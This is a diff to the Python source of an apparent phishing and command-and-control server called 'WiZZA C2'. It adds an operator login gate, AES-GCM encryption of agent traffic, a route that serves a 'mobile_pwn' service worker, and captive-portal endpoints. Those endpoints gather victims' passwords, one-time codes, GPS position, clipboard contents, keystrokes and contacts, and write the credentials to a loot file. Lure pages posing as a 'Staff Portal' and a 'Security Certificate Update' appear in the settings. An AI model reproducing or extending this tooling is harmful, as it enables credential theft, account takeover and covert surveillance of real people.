@@ -158,16 +158,145 @@ PAYLOAD_DIR = os.environ.get("PAYLOAD_DIR",os.path.join(_HOME,".wizza","payloads
 LOOT_DIR    = os.path.join(LOG_DIR,"loot")
 MOBILE_DIR  = os.path.join(LOG_DIR,"mobile")
 CREDS_FILE  = f"{LOG_DIR}/credentials.txt"
-# Clean lure path — set via LURE_PATH env var; email links point here
 LURE_PATH   = os.environ.get("LURE_PATH",  "/docs")
 LURE_TITLE  = os.environ.get("LURE_TITLE", "Security Certificate Update")
 
 for d in [LOG_DIR,PAYLOAD_DIR,LOOT_DIR,MOBILE_DIR]: os.makedirs(d,exist_ok=True)
 
+# ── Authentication ────────────────────────────────────────────────────────────
+import secrets as _secrets, hmac as _hmac
+_AUTH_FILE = os.path.join(_HOME, ".wizza", "c2_auth.json")
+
+def _load_or_create_auth():
+    """Load or generate operator credentials + session token store."""
+    if os.path.exists(_AUTH_FILE):
+        try:
+            d = json.load(open(_AUTH_FILE))
+            return d.get("password_hash",""), d.get("sessions", [])
+        except Exception:
+            pass
+    # First run — generate a strong random password
+    pw = _secrets.token_urlsafe(16)
+    ph = hashlib.sha256(pw.encode()).hexdigest()
+    os.makedirs(os.path.dirname(_AUTH_FILE), exist_ok=True)
+    json.dump({"password_hash": ph, "sessions": []}, open(_AUTH_FILE,"w"))
+    print(f"\n  ╔══════════════════════════════════════════╗")
+    print(f"  ║  C2 PASSWORD (first run — save this!):  ║")
+    print(f"  ║  {pw:<40}  ║")
+    print(f"  ╚══════════════════════════════════════════╝\n")
+    return ph, []
+
+_PW_HASH, _SESSIONS = _load_or_create_auth()
+_SESSIONS = set(_SESSIONS)
+_AUTH_LOCK = threading.Lock()
+# Paths that don't require auth (agent beacons, assets)
+_PUBLIC_PATHS = {"/agent/register","/agent/poll","/agent/result","/agent/data",
+                 "/catch","/kl","/js-agent.js","/sw.js","/manifest.json","/icon.png",
+                 "/mobile/register","/mobile/poll","/mobile/data","/dns-c2",
+                 # mobile_pwn captive portal endpoints — alias into /mobile/data
+                 "/mobile_catch","/sw_beacon","/mobile_sw.js","/sync"}
+
+def _check_auth(handler):
+    """Return True if request is authenticated. Sends 401 and returns False if not."""
+    path = urlparse(handler.path).path
+    # Agent endpoints are always public
+    if any(path.startswith(p) for p in _PUBLIC_PATHS): return True
+    # Check session cookie
+    cookie = handler.headers.get("Cookie","")
+    for part in cookie.split(";"):
+        k,_,v = part.strip().partition("=")
+        if k.strip() == "c2sid":
+            with _AUTH_LOCK:
+                if v.strip() in _SESSIONS: return True
+    # Not authenticated
+    handler.send_response(302)
+    handler.send_header("Location", "/c2login")
+    handler.end_headers()
+    return False
+
+def _do_login(handler):
+    """Handle POST /c2login — check password, set cookie."""
+    length = int(handler.headers.get("Content-Length",0))
+    body = handler.rfile.read(length).decode(errors="replace")
+    params = {}
+    for part in body.split("&"):
+        k,_,v = part.partition("=")
+        params[k] = v.replace("+"," ")
+    pw = params.get("pw","").strip()
+    ph = hashlib.sha256(pw.encode()).hexdigest()
+    if _hmac.compare_digest(ph, _PW_HASH):
+        sid = _secrets.token_hex(32)
+        with _AUTH_LOCK:
+            _SESSIONS.add(sid)
+            # Persist sessions
+            try:
+                d = json.load(open(_AUTH_FILE))
+                d["sessions"] = list(_SESSIONS)[-50:]  # keep last 50
+                json.dump(d, open(_AUTH_FILE,"w"))
+            except Exception: pass
+        handler.send_response(302)
+        handler.send_header("Set-Cookie", f"c2sid={sid}; Path=/; HttpOnly; SameSite=Strict")
+        handler.send_header("Location", "/panel")
+        handler.end_headers()
+    else:
+        handler.send_response(200)
+        handler.send_header("Content-Type","text/html")
+        handler.end_headers()
+        handler.wfile.write(_LOGIN_PAGE(error=True).encode())
+
+_LOGIN_HTML = """<!DOCTYPE html><html><head><meta charset=UTF-8><title>C2 Login</title>
+<style>*{{box-sizing:border-box;margin:0;padding:0}}
+body{{background:#0d1117;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:monospace}}
+.card{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:40px 36px;width:340px}}
+h2{{color:#58a6ff;margin-bottom:24px;font-size:16px;text-align:center;letter-spacing:2px;text-transform:uppercase}}
+label{{color:#8b949e;font-size:12px;display:block;margin-bottom:6px}}
+input{{width:100%;padding:9px 12px;background:#0d1117;border:1px solid #30363d;border-radius:4px;
+       color:#c9d1d9;font-family:monospace;font-size:14px;margin-bottom:16px;outline:none}}
+input:focus{{border-color:#58a6ff}}
+button{{width:100%;padding:10px;background:#238636;color:white;border:none;border-radius:4px;
+        font-size:14px;cursor:pointer;font-family:monospace;letter-spacing:1px}}
+button:hover{{background:#2ea043}}
+.err{{color:#f85149;font-size:12px;text-align:center;margin-top:12px}}
+</style></head><body>
+<div class="card">
+  <h2>&#x25B6; WiZZA C2</h2>
+  <form method="POST" action="/c2login">
+    <label>OPERATOR PASSWORD</label>
+    <input type="password" name="pw" autofocus required>
+    <button type="submit">ACCESS</button>
+    {err}
+  </form>
+</div></body></html>"""
+
+def _LOGIN_PAGE(error=False):
+    err = '<p class="err">&#x2717; Invalid password</p>' if error else ''
+    return _LOGIN_HTML.format(err=err)
+
+# ── AES-256-GCM encryption for agent comms ───────────────────────────────────
+try:
+    from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _AESGCM
+    _AES_KEY = os.environ.get("C2_AES_KEY","").encode() or _secrets.token_bytes(32)
+    _AES_KEY = _AES_KEY[:32].ljust(32, b'\0')
+    _CRYPTO_OK = True
+except ImportError:
+    _CRYPTO_OK = False
+
+def _aes_encrypt(data: bytes) -> str:
+    if not _CRYPTO_OK: return base64.b64encode(data).decode()
+    nonce = _secrets.token_bytes(12)
+    ct = _AESGCM(_AES_KEY).encrypt(nonce, data, None)
+    return base64.b64encode(nonce + ct).decode()
+
+def _aes_decrypt(b64: str) -> bytes:
+    if not _CRYPTO_OK: return base64.b64decode(b64)
+    raw = base64.b64decode(b64)
+    nonce, ct = raw[:12], raw[12:]
+    return _AESGCM(_AES_KEY).decrypt(nonce, ct, None)
+
 # Mobile agent store: {sid: {info, cmds[], data[]}}
 mobile_agents  = {}
-mobile_cmds    = defaultdict(list)  # sid -> [pending cmds]
-mobile_data    = defaultdict(list)  # sid -> [received data]
+mobile_cmds    = defaultdict(list)
+mobile_data    = defaultdict(list)
 
 USE_TLS = os.environ.get("C2_TLS","1") != "0"
 
@@ -479,7 +608,7 @@ MANIFEST=json.dumps({"name":"Staff Portal","short_name":"Portal","start_url":"/b
 BANNER="""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
 <meta name="apple-mobile-web-app-capable" content="yes">
-<title>Staff Portal — Office of the President</title>
+<title>Staff Portal</title>
 <link rel="manifest" href="/manifest.json">
 <style>
 *{box-sizing:border-box;margin:0;padding:0}html,body{height:100%}
@@ -857,7 +986,26 @@ class H(BaseHTTPRequestHandler):
         p=urlparse(self.path); qs=parse_qs(p.query)
         path=p.path
 
+        # ── Login page ──
+        if path == "/c2login":
+            self.send_response(200); self.send_header("Content-Type","text/html"); self.end_headers()
+            self.wfile.write(_LOGIN_PAGE().encode()); return
+
+        # ── Auth gate ──
+        if not _check_auth(self): return
+
         if path=="/js-agent.js": self._send(JS_AGENT,"application/javascript"); return
+        # Serve mobile_pwn Service Worker through C2 (so it runs on C2 origin)
+        if path=="/mobile_sw.js":
+            try:
+                sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../modules"))
+                from mobile_pwn import _SW_JS as _MSW
+                host = self.headers.get("Host","localhost")
+                sw   = _MSW.replace("self.location.origin", f"'http://{host}'")
+                self._send(sw, "application/javascript")
+            except Exception:
+                self._send(b"// mobile_sw unavailable", "application/javascript")
+            return
         if path.startswith("/sw.js"):
             aid=qs.get("aid",["sw"])[0]; host=self.headers.get("Host","localhost")
             sw=SW_JS.replace("__C2URL__",f"https://{host}").replace("__AID__",aid)
@@ -1680,6 +1828,10 @@ class H(BaseHTTPRequestHandler):
         p=urlparse(self.path); qs=parse_qs(p.query)
         n=int(self.headers.get("Content-Length",0)); b=self.rfile.read(n)
 
+        # ── Login handler ──
+        if p.path == "/c2login":
+            _do_login(self); return
+
         if p.path=="/agent/result":
             aid=qs.get("id",[""])[0]; cmd=unquote_plus(qs.get("cmd",[""])[0])
             out=b.decode(errors="replace")
@@ -1859,6 +2011,82 @@ class H(BaseHTTPRequestHandler):
                 self._send(json.dumps({"ok":True}), "application/json")
             except Exception as e:
                 self._send(json.dumps({"ok":False,"err":str(e)}), "application/json")
+            return
+
+        # mobile_pwn captive portal catch-all → funnel into /mobile/data pipeline
+        if p.path in ("/mobile_catch", "/sw_beacon", "/sync"):
+            try:
+                d = json.loads(b.decode(errors="replace")) if b else {}
+                src = self.client_address[0]
+                d.setdefault("_src", src)
+                d.setdefault("ts", ts())
+                dtype = d.get("t", d.get("type", "portal"))
+
+                # Map portal event types to C2 types
+                _type_map = {
+                    "creds":       "password",
+                    "otp":         "password",
+                    "fingerprint": "info",
+                    "gps":         "gps",
+                    "webrtc":      "info",
+                    "clipboard":   "clipboard",
+                    "paste":       "clipboard",
+                    "input":       "keylog",
+                    "change":      "keylog",
+                    "contacts":    "contacts",
+                    "sw_installed":"info",
+                    "push_sub":    "info",
+                    "bt_device":   "info",
+                    "fetch":       "info",
+                    "ping":        "info",
+                    "motion":      "info",
+                }
+                dtype_c2 = _type_map.get(dtype, dtype)
+
+                # Auto-register device as mobile agent if not seen
+                sid = src.replace(".", "_")
+                with _lock:
+                    if sid not in mobile_agents:
+                        ua = d.get("ua", "")
+                        os_type = "iOS" if any(x in ua.lower() for x in
+                                               ["iphone","ipad","ipod"]) \
+                                  else "Android" if "android" in ua.lower() \
+                                  else "Mobile"
+                        mobile_agents[sid] = {
+                            "sid": sid, "ip": src,
+                            "hostname": src, "os": os_type,
+                            "device": ua[:60], "ua": ua,
+                            "termux": False,
+                            "first_seen": ts(), "last_seen": ts(),
+                            "type": "captive_portal",
+                        }
+                        log(f"[PORTAL-AGENT] {sid} | {os_type} | {src}")
+                    mobile_agents[sid]["last_seen"] = ts()
+                    mobile_data[sid].append({"ts": ts(), "type": dtype_c2})
+
+                # Log credentials loudly
+                if dtype == "creds":
+                    line = (f"[{ts()}]  user={d.get('email','?')!r}  "
+                            f"pass={d.get('pass','?')!r}  "
+                            f"src=portal:{src}\n")
+                    open(CREDS_FILE, "a").write(line)
+                    log(f"[PORTAL-CREDS] {line.strip()}")
+                elif dtype == "otp":
+                    log(f"[PORTAL-OTP]   {src}  email={d.get('email')}  code={d.get('code')}")
+                elif dtype == "gps":
+                    log(f"[PORTAL-GPS]   {src}  lat={d.get('lat')}  lon={d.get('lon')}  acc={d.get('acc')}m")
+                elif dtype == "contacts":
+                    log(f"[PORTAL-CONTACTS] {src}  {len(d.get('data',[]))} entries")
+
+                # Persist to mobile dir
+                fname = f"{sid}_{dtype_c2}_{int(time.time())}.json"
+                os.makedirs(MOBILE_DIR, exist_ok=True)
+                with open(os.path.join(MOBILE_DIR, fname), "w") as f:
+                    json.dump({"sid": sid, "ts": ts(), "type": dtype_c2, "data": d}, f)
+
+                self._send(json.dumps({"ok": True}), "application/json")
+            except Exception as e:
+                self._send(json.dumps({"ok": False, "err": str(e)}), "application/json")
             return
 
         # Send command to mobile agent (from operator)
